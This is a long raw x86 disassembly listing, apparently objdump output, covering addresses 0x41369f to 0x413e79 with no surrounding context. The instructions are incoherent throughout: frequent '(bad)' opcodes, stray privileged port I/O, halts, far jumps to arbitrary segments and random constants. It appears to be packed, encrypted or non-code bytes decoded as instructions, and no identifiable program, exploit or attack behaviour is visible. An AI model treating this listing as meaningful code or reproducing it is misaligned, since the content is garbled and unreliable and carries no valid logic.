  41369f:	add    cl,BYTE PTR [ecx+0xbec0f6b]
  4136a5:	imul   edi,DWORD PTR [edx],0x53
  4136a8:	pop    ecx
  4136a9:	inc    ebp
  4136aa:	ret    
  4136ab:	and    dh,bl
  4136ad:	retf   0x1f48
  4136b0:	shr    bl,0x75
  4136b3:	sbb    al,0x49
  4136b5:	jb     0x41371d
  4136b7:	ins    DWORD PTR es:[edi],dx
  4136b8:	sbb    esi,DWORD PTR ds:0x794cffa1
  4136be:	pop    ecx
  4136bf:	jo     0x413703
  4136c1:	mov    ch,0xb6
  4136c3:	stc    
  4136c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136c5:	iret   
  4136c6:	mov    ds:0x8e2f1336,al
  4136cb:	ficomp WORD PTR [ecx+0x27]
  4136ce:	fisttp DWORD PTR [ecx]
  4136d0:	mov    ds:0x695a1c81,eax
  4136d5:	push   esp
  4136d6:	pop    esi
  4136d7:	lock clc 
  4136d9:	sbb    al,0x45
  4136db:	aaa    
  4136dc:	out    dx,al
  4136dd:	jb     0x41367d
  4136df:	(bad)  
  4136e0:	cdq    
  4136e1:	mov    al,0x83
  4136e3:	dec    ebp
  4136e4:	imul   edx,DWORD PTR [ecx+ebx*2+0x10210221],0x93e61ca3
  4136ef:	mov    cl,0xb7
  4136f1:	mov    ch,0x46
  4136f3:	sub    al,0x99
  4136f5:	mov    edx,?
  4136f7:	xchg   BYTE PTR [esi-0x2eaa219e],bl
  4136fd:	or     esi,DWORD PTR [ecx-0x74]
  413700:	clc    
  413701:	out    dx,eax
  413702:	pop    esi
  413703:	shl    edx,0x5b
  413706:	jne    0x413781
  413708:	fimul  WORD PTR [ebp-0x21714f6c]
  41370e:	int    0x3d
  413710:	ret    0xf779
  413713:	cmp    eax,0xcf179b76
  413718:	jl     0x413750
  41371a:	pop    ds
  41371b:	daa    
  41371c:	and    BYTE PTR [esi+ebp*8],bl
  41371f:	retf   
  413720:	or     ebp,ecx
  413722:	into   
  413723:	lahf   
  413724:	inc    eax
  413725:	imul   ebx,esi,0xffffffb9
  413728:	jmp    0xf7ba:0x3a770265
  41372f:	js     0x413783
  413731:	jae    0x413718
  413733:	xor    eax,0x16aeda2f
  413738:	push   edi
  413739:	add    ebp,DWORD PTR [ebx]
  41373b:	stc    
  41373c:	ret    
  41373d:	inc    edi
  41373e:	jge    0x4136eb
  413740:	push   es
  413741:	stc    
  413742:	les    ebx,FWORD PTR [ecx-0x4e]
  413745:	sub    eax,0x77144b9
  41374a:	sub    al,0x47
  41374c:	and    ah,al
  41374e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41374f:	fwait
  413750:	mov    bh,0xeb
  413752:	mov    eax,0xf707f118
  413757:	and    eax,0xd0073b62
  41375c:	push   edx
  41375d:	xor    esp,0xffffff83
  413760:	xchg   edx,eax
  413761:	xchg   DWORD PTR [ecx],ecx
  413763:	mov    ds:0x14790ac3,eax
  413768:	imul   edx,DWORD PTR [eax-0x63],0x2fa41104
  41376f:	(bad)  ds:0x8354c1d5
  413775:	stos   DWORD PTR es:[edi],eax
  413776:	out    0x18,eax
  413778:	cwde   
  413779:	fsubp  st(5),st
  41377b:	sbb    ch,ah
  41377d:	retf   0x9880
  413780:	adc    eax,DWORD PTR [edi+0x6e1bc053]
  413786:	pop    edi
  413787:	or     al,0xea
  413789:	out    0x65,eax
  41378b:	cdq    
  41378c:	cmc    
  41378d:	in     eax,0x9b
  41378f:	xchg   edi,eax
  413790:	sub    DWORD PTR [edi+0x38],ebx
  413793:	jmp    0xf7f4:0x950e57ec
  41379a:	lods   eax,DWORD PTR ds:[esi]
  41379b:	sub    al,0x6c
  41379d:	xor    al,0xe8
  41379f:	dec    edx
  4137a0:	dec    edi
  4137a1:	push   esp
  4137a2:	(bad)  
  4137a3:	sbb    eax,0x9c590992
  4137a8:	xchg   ebp,eax
  4137a9:	push   ds
  4137aa:	inc    edi
  4137ab:	mov    WORD PTR [edx+0x636ec0f2],ds
  4137b1:	xchg   BYTE PTR [eax-0x532fe21d],dh
  4137b7:	cmp    DWORD PTR [esi-0x40],0x77
  4137bb:	sub    al,0x1
  4137bd:	into   
  4137be:	inc    esi
  4137bf:	mov    ch,0x96
  4137c1:	push   eax
  4137c2:	sbb    ebx,DWORD PTR [esi+0x4320e313]
  4137c8:	inc    edi
  4137c9:	mov    eax,ds:0xebdf0140
  4137ce:	mov    ebp,0xc46cdf0
  4137d3:	adc    al,0xb1
  4137d5:	rcl    BYTE PTR [edx],0x9f
  4137d8:	arpl   WORD PTR [edi],si
  4137da:	dec    ebp
  4137db:	pop    esp
  4137dc:	jg     0x413772
  4137de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137df:	xor    cl,0x5e
  4137e2:	dec    ebp
  4137e3:	dec    esp
  4137e4:	sbb    ch,BYTE PTR [edx-0x40]
  4137e7:	inc    esi
  4137e8:	out    dx,eax
  4137e9:	mov    DWORD PTR [esi-0x462911d8],esi
  4137ef:	test   cl,0x1b
  4137f2:	jp     0x413836
  4137f4:	hlt    
  4137f5:	out    0xf0,al
  4137f7:	jle    0x41380d
  4137f9:	cli    
  4137fa:	mov    edx,0xae3d46c8
  4137ff:	mov    ds:0x816adedf,eax
  413804:	(bad)  
  413806:	popf   
  413807:	and    eax,ebx
  413809:	mov    dh,0xb3
  41380b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41380c:	aad    0x38
  41380e:	ss jecxz 0x4137ce
  413811:	scas   eax,DWORD PTR es:[edi]
  413812:	xchg   esi,eax
  413813:	adc    ch,BYTE PTR [edx-0x4033a03c]
  413819:	sub    ecx,DWORD PTR [edx+edx*1-0x4a]
  41381d:	mov    edx,0xa3c15075
  413822:	aaa    
  413823:	not    BYTE PTR [esi-0x5e]
  413826:	scas   eax,DWORD PTR es:[edi]
  413827:	xchg   esi,eax
  413828:	push   esi
  413829:	push   0xffffff93
  41382b:	ss xchg ebp,eax
  41382d:	sti    
  41382e:	(bad)  
  41382f:	push   esi
  413830:	fst    QWORD PTR [ecx-0x745bbaf7]
  413836:	test   BYTE PTR [ecx+0x50a86d8],bl
  41383c:	into   
  41383d:	jl     0x4137c8
  41383f:	mov    edi,0x30051e4d
  413844:	retf   
  413845:	jb     0x41388e
  413847:	int3   
  413848:	maxps  xmm4,XMMWORD PTR [edx-0x57f7cd0a]
  41384f:	xchg   edi,eax
  413850:	sub    al,0xaa
  413852:	stos   DWORD PTR es:[edi],eax
  413853:	pop    edi
  413854:	sub    DWORD PTR [esi+0x74],ebp
  413857:	rcl    BYTE PTR [ecx+0x774fa3a8],0x34
  41385e:	adc    ah,BYTE PTR [esi]
  413860:	out    dx,al
  413861:	call   FWORD PTR [ecx+0x68b0477e]
  413867:	lock loope 0x4137ed
  41386a:	mov    al,0xeb
  41386c:	dec    edi
  41386d:	into   
  41386e:	outs   dx,BYTE PTR ds:[esi]
  41386f:	in     eax,0x94
  413871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413872:	mov    bl,0x4e
  413874:	cmp    esp,DWORD PTR [edx]
  413876:	pop    edx
  413877:	mov    edi,0xa53bc58b
  41387c:	xor    cl,BYTE PTR [ebx+0x4c]
  41387f:	test   BYTE PTR [ebx-0x663b7200],ah
  413885:	mov    dh,0xe8
  413887:	push   esp
  413888:	ins    DWORD PTR es:[edi],dx
  413889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41388a:	fimul  DWORD PTR [edi+edi*1+0x6ee87418]
  413891:	(bad)
  413894:	lahf   
  413895:	or     edx,DWORD PTR [esi+esi*8+0x2d]
  413899:	in     eax,0xba
  41389b:	in     al,dx
  41389c:	lods   eax,DWORD PTR ds:[esi]
  41389d:	mov    ch,0x9b
  41389f:	and    ebp,DWORD PTR [ebx]
  4138a1:	dec    edx
  4138a2:	icebp  
  4138a3:	mov    dl,0xb3
  4138a5:	xchg   dl,bl
  4138a7:	sbb    DWORD PTR [esi],esp
  4138a9:	pop    ebp
  4138aa:	scas   al,BYTE PTR es:[edi]
  4138ab:	mov    dl,BYTE PTR [ebx-0x3b5ce34e]
  4138b1:	mov    al,0x7
  4138b3:	and    al,0x93
  4138b5:	push   es
  4138b6:	push   es
  4138b7:	inc    edi
  4138b8:	div    DWORD PTR [edx+0x892fb9]
  4138be:	hlt    
  4138bf:	imul   eax,DWORD PTR [edi],0x9cab5d83
  4138c5:	jmp    0x41387e
  4138c7:	std    
  4138c8:	inc    ecx
  4138c9:	in     eax,dx
  4138ca:	xchg   esi,eax
  4138cb:	adc    al,0xcd
  4138cd:	fistp  DWORD PTR [edi-0x28]
  4138d0:	js     0x4138b9
  4138d2:	pop    edx
  4138d3:	and    eax,0x109fd87c
  4138d8:	cmp    DWORD PTR [ebp+0x2684c6dc],ebp
  4138de:	add    DWORD PTR [eax+eax*2+0x5df3b929],ebp
  4138e5:	sahf   
  4138e6:	dec    ecx
  4138e7:	call   0x6bce7643
  4138ec:	clc    
  4138ed:	pop    ebx
  4138ee:	imul   ecx,DWORD PTR [ecx],0x11
  4138f1:	mov    eax,ds:0xc2f802b9
  4138f6:	rcr    DWORD PTR [ebp+0x3813345d],0x5f
  4138fd:	ret    
  4138fe:	mov    bl,0xcc
  413900:	enter  0xce11,0xcc
  413904:	jecxz  0x413985
  413906:	dec    edi
  413907:	push   ecx
  413908:	sbb    DWORD PTR [ecx+eiz*8-0x10],ebx
  41390c:	shl    BYTE PTR [eax+eax*8],1
  41390f:	inc    esp
  413910:	(bad)  
  413911:	stos   DWORD PTR es:[edi],eax
  413912:	xchg   BYTE PTR [eax+0x70b437a8],ah
  413918:	pop    eax
  413919:	pop    ebx
  41391a:	dec    ebp
  41391b:	push   edx
  41391c:	imul   ebp,DWORD PTR gs:[ebp-0x32],0x3c
  413921:	inc    eax
  413922:	call   0xc3445e34
  413927:	imul   esp,DWORD PTR [ecx],0x523181dd
  41392d:	dec    ebp
  41392e:	jo     0x413977
  413930:	adc    BYTE PTR [ebx+0x4fafb396],0x21
  413937:	aas    
  413938:	jp     0x4139a6
  41393a:	and    DWORD PTR [eax+0x2942b2ea],0x39
  413941:	cld    
  413942:	inc    ebx
  413943:	ret    0x7423
  413946:	lahf   
  413947:	pop    eax
  413948:	dec    eax
  413949:	fimul  DWORD PTR [eax]
  41394b:	add    al,0x6c
  41394d:	add    ebp,DWORD PTR [esi-0x6a90bab2]
  413953:	mov    ebx,0x99f35e31
  413958:	mov    ecx,0x329d63f6
  41395d:	(bad)  
  41395e:	loope  0x4139ce
  413960:	outs   dx,BYTE PTR ds:[esi]
  413961:	repz fidiv WORD PTR [ebx+ebp*8-0x2e0dfb43]
  413969:	fwait
  41396a:	shr    esi,0x13
  41396d:	mov    edx,0x7a601353
  413972:	mov    edi,0x63409ecd
  413977:	out    0xaf,eax
  413979:	push   eax
  41397a:	add    BYTE PTR [edi+edi*4+0x2f503b47],al
  413981:	adc    BYTE PTR [edx],ch
  413983:	sbb    BYTE PTR [esi-0x45],0x50
  413987:	lods   al,BYTE PTR ds:[esi]
  413988:	ret    
  413989:	push   ds
  41398a:	mov    eax,ds:0x29d5a2ac
  41398f:	enter  0x8b52,0xd
  413993:	neg    BYTE PTR [ebp-0x66]
  413996:	push   esp
  413997:	push   cs
  413998:	aad    0x4
  41399a:	jns    0x413998
  41399c:	inc    ebx
  41399d:	pop    ebx
  41399e:	mov    gs,edi
  4139a0:	push   ds
  4139a1:	xchg   ebx,edx
  4139a3:	iret   
  4139a4:	aaa    
  4139a5:	fwait
  4139a6:	and    ebx,DWORD PTR [edx+0x4f]
  4139a9:	inc    esi
  4139aa:	jnp    0x4139ae
  4139ac:	call   0x8c39:0xb014505b
  4139b3:	jl     0x413995
  4139b5:	lahf   
  4139b6:	pop    ebx
  4139b7:	mov    al,ds:0xa44e5148
  4139bc:	mov    cl,0xc3
  4139be:	jo     0x4139b4
  4139c0:	iret   
  4139c1:	pop    edx
  4139c2:	js     0x413990
  4139c4:	call   0xb489:0x7b2bb693
  4139cb:	pushf  
  4139cc:	test   DWORD PTR ds:0x48a0c623,ebp
  4139d2:	pop    ds
  4139d3:	dec    esi
  4139d4:	sti    
  4139d5:	pop    esp
  4139d6:	add    al,0x8f
  4139d8:	popf   
  4139d9:	sbb    edi,DWORD PTR [ecx]
  4139db:	mov    BYTE PTR [edx-0x2f1b60cc],dl
  4139e1:	stos   DWORD PTR es:[edi],eax
  4139e2:	mov    eax,0x54930a9a
  4139e7:	rcr    BYTE PTR [ecx+eax*2+0x24],cl
  4139eb:	or     eax,0x6f8a9332
  4139f0:	test   DWORD PTR [edx],eax
  4139f2:	gs enter 0xfe4a,0x20
  4139f7:	out    dx,eax
  4139f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139f9:	ror    BYTE PTR [esi+0x5f],cl
  4139fc:	mov    bh,0x6a
  4139fe:	nop
  4139ff:	addr16 lahf 
  413a01:	test   BYTE PTR [ecx],al
  413a03:	leave  
  413a04:	pop    edx
  413a05:	cmp    eax,0xaeee6996
  413a0a:	aas    
  413a0b:	imul   ebx,DWORD PTR [ecx+0x2c],0x6c478c58
  413a12:	adc    eax,0x2fb5c595
  413a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a19:	and    eax,DWORD PTR [ecx+edi*8-0x29]
  413a1d:	cmp    bl,al
  413a1f:	test   al,0xaa
  413a21:	jno    0x413a96
  413a23:	int3   
  413a24:	inc    eax
  413a25:	lds    ecx,FWORD PTR [edi+eiz*2-0x3c]
  413a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a2a:	imul   ecx,DWORD PTR es:[edi+ecx*2+0x1b842bb],0xfffffffb
  413a33:	ror    DWORD PTR [ebp-0x51],cl
  413a36:	retf   0xfedf
  413a39:	jmp    esi
  413a3b:	jo     0x413a16
  413a3d:	(bad)  
  413a3f:	ins    BYTE PTR es:[edi],dx
  413a40:	or     al,0x22
  413a42:	cld    
  413a43:	jle    0xc725fbfd
  413a49:	pusha  
  413a4a:	dec    esi
  413a4b:	cmp    bl,BYTE PTR [edx-0x67683bf]
  413a51:	adc    BYTE PTR [ebp+0x4226cb2c],0xe3
  413a58:	imul   esi,ebp,0x9b24e8b5
  413a5e:	mov    ds:0xde960e52,eax
  413a63:	or     BYTE PTR [eax-0x7da8d68],cl
  413a69:	push   edi
  413a6a:	mov    esp,0x56cd7715
  413a6f:	rcr    BYTE PTR [edi-0x650fed46],cl
  413a75:	cmp    eax,0x2e686841
  413a7a:	xor    al,0xd
  413a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a7d:	add    al,0x70
  413a7f:	mov    dl,0x44
  413a81:	push   esp
  413a82:	(bad)  
  413a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a84:	xchg   ecx,eax
  413a85:	retf   0x2d99
  413a88:	ins    BYTE PTR es:[edi],dx
  413a89:	imul   ebx,DWORD PTR [esi-0x6daa5ca3],0x30
  413a90:	cmp    al,0x87
  413a92:	mov    eax,0x24ac3443
  413a97:	psrld  mm7,QWORD PTR [esi]
  413a9a:	adc    al,0xab
  413a9c:	cmp    eax,DWORD PTR [ebx-0x56]
  413a9f:	adc    ah,BYTE PTR [edi-0xe]
  413aa2:	pusha  
  413aa3:	pop    ecx
  413aa4:	pop    ebp
  413aa5:	sar    DWORD PTR [edx-0x4801ced0],0x9b
  413aac:	fwait
  413aad:	lahf   
  413aae:	ds dec ebx
  413ab0:	int    0x4
  413ab2:	inc    esi
  413ab3:	lods   eax,DWORD PTR ds:[esi]
  413ab4:	dec    ebp
  413ab5:	xchg   bp,ax
  413ab7:	dec    ebx
  413ab8:	pop    es
  413ab9:	in     eax,dx
  413aba:	push   es
  413abb:	cmp    DWORD PTR [edx+0x771a08],esi
  413ac1:	push   DWORD PTR [edi]
  413ac3:	sbb    DWORD PTR [esi+0x18713273],ecx
  413ac9:	loop   0x413ad6
  413acb:	push   eax
  413acc:	push   ebp
  413acd:	(bad)  
  413ace:	repnz pop ebx
  413ad0:	ror    esi,cl
  413ad2:	ret    0x3a2
  413ad5:	jl     0x413a64
  413ad7:	pop    ecx
  413ad8:	sub    BYTE PTR [ebx],ah
  413ada:	mov    eax,0xc390b99a
  413adf:	pusha  
  413ae0:	sti    
  413ae1:	loope  0x413b58
  413ae3:	inc    edx
  413ae4:	aam    0x2b
  413ae6:	mov    bl,0xc8
  413ae8:	fadd   st(4),st
  413aea:	mov    esi,0xd7772ca9
  413aef:	ds test eax,0x5a458062
  413af5:	mov    dh,0x6a
  413af7:	sar    edi,1
  413af9:	out    0xaf,eax
  413afb:	fs pop edx
  413afd:	sbb    al,0x2e
  413aff:	xchg   ebp,eax
  413b00:	in     al,0xb1
  413b02:	imul   ebp,DWORD PTR [ebp-0x7bc1e36c],0x6d
  413b09:	push   es
  413b0a:	add    BYTE PTR [esi+0x386d29b3],0xe7
  413b11:	add    BYTE PTR [ebx+0x14cefd25],ch
  413b17:	or     eax,0xfe22e0c
  413b1c:	or     BYTE PTR [edx],dl
  413b1e:	nop
  413b1f:	fiadd  DWORD PTR [edx]
  413b21:	mov    dh,0xd7
  413b23:	adc    al,ch
  413b25:	adc    esi,DWORD PTR [ecx-0x1af3816f]
  413b2b:	mov    eax,0xdfe5c1c6
  413b30:	pop    ecx
  413b31:	xor    al,0x6b
  413b33:	xchg   esi,edx
  413b35:	pop    ss
  413b36:	cmp    eax,0x4b7345b8
  413b3b:	in     eax,dx
  413b3c:	adc    al,BYTE PTR [edi]
  413b3e:	ds xchg edx,eax
  413b40:	dec    ebp
  413b41:	(bad)  
  413b42:	pop    esi
  413b43:	jmp    0x413b5e
  413b45:	jne    0x413ad7
  413b47:	sbb    edi,DWORD PTR [eax-0x7c]
  413b4a:	push   edx
  413b4b:	inc    eax
  413b4c:	jecxz  0x413ad8
  413b4e:	xor    DWORD PTR [edx+0x6978f8bb],eax
  413b54:	push   ds
  413b55:	popa   
  413b56:	push   ecx
  413b57:	(bad)
  413b5a:	test   eax,0x518b289b
  413b5f:	sub    ebx,DWORD PTR [esi+ebx*8+0x7d0be414]
  413b66:	mov    edi,0x903c5b30
  413b6b:	push   ebx
  413b6c:	adc    ebx,esi
  413b6e:	cmp    eax,0x4cae036c
  413b73:	pop    ebx
  413b74:	adc    al,0xa2
  413b76:	xchg   edx,eax
  413b77:	push   ebp
  413b78:	loopne 0x413afe
  413b7a:	sub    DWORD PTR [ebp-0x4f73729],ebp
  413b80:	xor    edx,DWORD PTR [edx+0x2cf5584e]
  413b86:	mul    DWORD PTR [ecx-0x5847febb]
  413b8c:	pop    edi
  413b8d:	jge    0x413c09
  413b8f:	lds    ebx,FWORD PTR [eax]
  413b91:	loopne 0x413b38
  413b93:	sahf   
  413b94:	sbb    dh,BYTE PTR [eax-0x7cc7a87a]
  413b9a:	repnz push ecx
  413b9c:	or     eax,0xf8b90bd4
  413ba1:	jns    0x413bdc
  413ba3:	daa    
  413ba4:	out    0xbb,eax
  413ba6:	mov    eax,0xc49d1b6
  413bab:	scas   eax,DWORD PTR es:[edi]
  413bac:	pop    es
  413bad:	jmp    0x413bda
  413baf:	xchg   ebx,eax
  413bb0:	inc    ecx
  413bb1:	loopne 0x413b42
  413bb3:	and    edx,ebp
  413bb5:	pop    eax
  413bb6:	adc    BYTE PTR [edi+0x4e],cl
  413bb9:	loopne 0x413b66
  413bbb:	retf   
  413bbc:	or     al,0x2
  413bbe:	out    0x58,al
  413bc0:	iret   
  413bc1:	je     0x413bfa
  413bc3:	test   DWORD PTR [ecx-0x4],esi
  413bc6:	leave  
  413bc7:	lds    eax,FWORD PTR [edi*1+0x4a1725bc]
  413bce:	hlt    
  413bcf:	lds    ebx,FWORD PTR [ebx]
  413bd1:	cmp    edi,DWORD PTR [edi-0x51]
  413bd4:	int3   
  413bd5:	xchg   esi,eax
  413bd6:	ins    DWORD PTR es:[edi],dx
  413bd7:	imul   eax,DWORD PTR [ebp+0x6],0xee407e71
  413bde:	sub    eax,0xe94a4671
  413be3:	push   cs
  413be4:	adc    eax,0x60254d75
  413be9:	mov    ds:0xd1c33045,al
  413bee:	fist   WORD PTR [esi]
  413bf0:	mov    esi,0x25e294b2
  413bf5:	or     al,0x6e
  413bf7:	push   0x7f
  413bf9:	aaa    
  413bfa:	ins    DWORD PTR es:[edi],dx
  413bfb:	lahf   
  413bfc:	or     esp,edx
  413bfe:	inc    esi
  413bff:	mov    esi,0x68002754
  413c04:	mov    al,ds:0xf4ddfe78
  413c09:	enter  0xf3ca,0x79
  413c0d:	and    dl,BYTE PTR [edi-0x69]
  413c10:	loope  0x413c77
  413c12:	imul   ebx,ebp,0xd081ae01
  413c18:	push   edi
  413c19:	int3   
  413c1a:	xchg   edx,eax
  413c1b:	dec    ebp
  413c1c:	lea    ebp,[ebx+0x5da0b11a]
  413c22:	lds    eax,FWORD PTR [ecx+edi*8]
  413c25:	rcl    DWORD PTR ds:0x8c2c9dfe,0xf
  413c2c:	stos   DWORD PTR es:[edi],eax
  413c2d:	test   ah,al
  413c2f:	lds    esi,FWORD PTR [edi]
  413c31:	(bad)  
  413c33:	jmp    0x413c02
  413c35:	jp     0x413c85
  413c37:	cmp    eax,0x9c71f894
  413c3c:	mov    bh,0x53
  413c3e:	pop    esi
  413c3f:	pop    edx
  413c40:	add    DWORD PTR [esi+0x4a],0x5aa16153
  413c47:	sbb    al,BYTE PTR [edi+0x4]
  413c4a:	cdq    
  413c4b:	repz pushf 
  413c4d:	jb     0x413bf7
  413c4f:	cmp    dh,bl
  413c51:	inc    esi
  413c52:	sub    eax,DWORD PTR [eax]
  413c54:	pop    edi
  413c55:	adc    DWORD PTR [esi+0xc],0xffffffbe
  413c59:	jno    0x413cae
  413c5b:	lock je 0x413be3
  413c5e:	nop
  413c5f:	xor    edx,ebx
  413c61:	adc    dh,BYTE PTR [edx]
  413c63:	jo     0x413c87
  413c65:	es in  eax,dx
  413c67:	stc    
  413c68:	jle    0x413bfd
  413c6a:	mov    al,ds:0xbfef3ab4
  413c6f:	sbb    al,BYTE PTR [esp+esi*4-0x764a6459]
  413c76:	dec    edx
  413c77:	add    al,0x56
  413c79:	push   0xa4ebb897
  413c7e:	pop    edx
  413c7f:	enter  0x43d8,0x60
  413c83:	add    BYTE PTR [ebx-0x29],dh
  413c86:	mov    bh,0x47
  413c88:	push   ebx
  413c89:	cmp    al,0xa5
  413c8b:	dec    ebp
  413c8c:	mov    ebp,0x406f2448
  413c91:	add    edx,DWORD PTR [edx-0x68]
  413c94:	popf   
  413c95:	adc    dl,bh
  413c97:	cmp    DWORD PTR [edx],0xa8361335
  413c9d:	into   
  413c9e:	out    dx,al
  413c9f:	test   eax,0xb939fbff
  413ca4:	cmp    BYTE PTR [ebx+0x2a],0xf8
  413ca8:	xchg   edi,eax
  413ca9:	jnp    0x413cf9
  413cab:	mov    ch,0xc
  413cad:	call   0xd191d938
  413cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cb3:	mov    al,ds:0xb7d956cb
  413cb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cb9:	in     al,0x26
  413cbb:	jle    0x413ce0
  413cbd:	call   0xc0c:0xe6fd912d
  413cc4:	mov    eax,0x693920c7
  413cc9:	sub    edi,DWORD PTR [edi+0x74]
  413ccc:	push   eax
  413ccd:	push   ebx
  413cce:	xor    dh,dl
  413cd0:	test   al,0xe5
  413cd2:	test   eax,0x66957771
  413cd7:	inc    ebx
  413cd8:	loop   0x413ce3
  413cda:	paddusb mm3,mm4
  413cdd:	xchg   esp,eax
  413cde:	ins    DWORD PTR es:[edi],dx
  413cdf:	xor    BYTE PTR [eax+0x3b],bl
  413ce2:	fsub   DWORD PTR [edx]
  413ce5:	addr16 xchg edi,eax
  413ce7:	pop    esi
  413ce8:	mov    al,ds:0x78297f10
  413ced:	sub    ah,0x96
  413cf0:	test   DWORD PTR [eax-0x3a46f982],esi
  413cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cf7:	es aam 0xc4
  413cfa:	xchg   ecx,eax
  413cfb:	rol    BYTE PTR [esp+eax*2-0x39565385],cl
  413d02:	(bad)  
  413d03:	lods   eax,DWORD PTR ds:[esi]
  413d04:	lods   al,BYTE PTR ds:[esi]
  413d05:	ret    
  413d06:	jmp    0x413d16
  413d08:	ins    BYTE PTR es:[edi],dx
  413d09:	hlt    
  413d0a:	fwait
  413d0b:	mov    ebp,0xde1e4ea6
  413d10:	xor    edi,0x8bd945e0
  413d16:	sub    BYTE PTR [ecx+0x68],0x99
  413d1a:	test   eax,0x6f8ad45f
  413d1f:	inc    edi
  413d20:	stc    
  413d21:	loopne 0x413cfc
  413d23:	(bad)  
  413d24:	rol    esp,1
  413d26:	ficom  DWORD PTR [esi]
  413d29:	mov    ecx,0xe27ad07b
  413d2e:	jge    0x413d1b
  413d30:	les    edx,FWORD PTR [ecx]
  413d32:	pop    eax
  413d33:	fld    DWORD PTR [ecx-0x44f526ec]
  413d39:	mov    dh,0x73
  413d3b:	mov    DWORD PTR [esi-0xd052c72],ebp
  413d41:	clc    
  413d42:	jmp    0x5d6c:0x6fd77d5c
  413d49:	sbb    ebp,edx
  413d4b:	(bad)  
  413d4c:	lods   al,BYTE PTR ds:[esi]
  413d4e:	jno    0x413d05
  413d50:	dec    esp
  413d51:	pushf  
  413d52:	push   esp
  413d53:	pop    ss
  413d54:	pop    es
  413d55:	sub    al,dh
  413d57:	add    dl,BYTE PTR [edx]
  413d59:	iret   
  413d5a:	push   esp
  413d5b:	cmp    BYTE PTR [esp+ebp*4+0x75],al
  413d5f:	ins    BYTE PTR es:[edi],dx
  413d60:	test   cl,dh
  413d62:	mov    esp,0xaff564b1
  413d67:	jmp    0xdb7:0x66001ff9
  413d6e:	mov    BYTE PTR [edx+0x3c070b49],cl
  413d74:	(bad)  
  413d75:	test   eax,0x52626ae1
  413d7a:	push   cs
  413d7b:	xchg   ecx,eax
  413d7c:	jnp    0x413dbc
  413d7e:	imul   edx,ebp,0x3a
  413d81:	(bad)  
  413d82:	add    ecx,ebp
  413d84:	pushf  
  413d85:	push   esp
  413d86:	fs mov ebp,0x4df690c0
  413d8c:	jae    0x413d27
  413d8e:	das    
  413d8f:	mov    DWORD PTR [ecx-0x34],edx
  413d92:	ins    DWORD PTR es:[edi],dx
  413d93:	nop
  413d94:	jp     0x413e01
  413d96:	add    eax,0x8a8d6d4a
  413d9b:	aam    0x6c
  413d9d:	js     0x413ded
  413d9f:	mov    dh,0x66
  413da1:	xor    ebp,DWORD PTR [ecx]
  413da3:	loopne 0x413dca
  413da5:	add    edi,DWORD PTR [bp+si+0x31]
  413da9:	inc    edi
  413daa:	xor    BYTE PTR [ebx+ecx*8],0xfc
  413dae:	fidiv  DWORD PTR [edi-0x61327e52]
  413db4:	sar    BYTE PTR [ebp+0xa],1
  413db7:	dec    eax
  413db8:	cmc    
  413db9:	or     DWORD PTR [edi],edx
  413dbb:	and    ecx,0x8538305e
  413dc1:	mov    dl,bh
  413dc3:	aam    0x26
  413dc5:	addr16 mov al,0x2d
  413dc8:	inc    ebp
  413dc9:	test   eax,0x7500315c
  413dce:	xchg   esi,eax
  413dcf:	cmp    DWORD PTR [ebx-0x573d7419],eax
  413dd5:	fcomp  QWORD PTR [edi]
  413dd7:	xchg   edx,eax
  413dd8:	lods   eax,DWORD PTR ds:[esi]
  413dd9:	or     bh,cl
  413ddb:	mov    ds:0x4ec4628b,al
  413de0:	jb     0x413de1
  413de2:	pop    ss
  413de3:	stos   BYTE PTR es:[edi],al
  413de4:	mov    ebp,0xf3237312
  413de9:	(bad)  
  413dea:	shl    BYTE PTR [edi],1
  413dec:	mov    dh,0xa4
  413dee:	add    dh,BYTE PTR [esi-0x64a40129]
  413df4:	mov    WORD PTR [ecx+0xf7eaaf],gs
  413dfa:	adc    al,dl
  413dfc:	or     al,0x77
  413dfe:	sbb    DWORD PTR [eax],ecx
  413e00:	mov    bh,0xdd
  413e02:	mov    esi,0x7c738b95
  413e07:	xchg   edi,eax
  413e08:	sub    al,0x4a
  413e0a:	and    cl,BYTE PTR [ebx+0x1a4d84b0]
  413e10:	mov    ds:0xbde6720,al
  413e15:	add    dh,BYTE PTR [esp+edx*2-0x3bdf86d3]
  413e1c:	pop    edi
  413e1d:	push   edi
  413e1e:	adc    dh,BYTE PTR [esi+ebx*8+0x46]
  413e22:	int3   
  413e23:	test   DWORD PTR [edi+0x22],ecx
  413e26:	leave  
  413e27:	in     al,0xa2
  413e29:	mov    BYTE PTR [ebx-0x14],cl
  413e2c:	sbb    al,0x2
  413e2e:	mov    bl,0x6e
  413e30:	pop    edi
  413e31:	into   
  413e32:	jle    0x413e4d
  413e34:	jmp    0x413dea
  413e36:	jne    0x413dd8
  413e38:	and    DWORD PTR [edx+edx*1],0x46
  413e3c:	(bad)  
  413e3d:	or     al,0x3f
  413e3f:	xlat   BYTE PTR ds:[ebx]
  413e40:	or     DWORD PTR [edx],esi
  413e42:	xlat   BYTE PTR ds:[ebx]
  413e43:	cmp    al,0xe0
  413e45:	mov    eax,0x949c09cf
  413e4a:	retf   0x78cf
  413e4d:	mov    al,ds:0xb242c759
  413e52:	cli    
  413e53:	mov    ds:0xa46bcb03,al
  413e58:	sbb    eax,0xf67793c2
  413e5d:	jl     0x413de5
  413e5f:	je     0x413df5
  413e61:	jle    0x413e4e
  413e63:	mov    ds:0x3f67877b,eax
  413e68:	xor    eax,0xbf642bdc
  413e6d:	sti    
  413e6e:	call   0xc299c8b4
  413e73:	sti    
  413e74:	mov    eax,ds:0x2710199e
  413e79:	mov    ah,0xc1
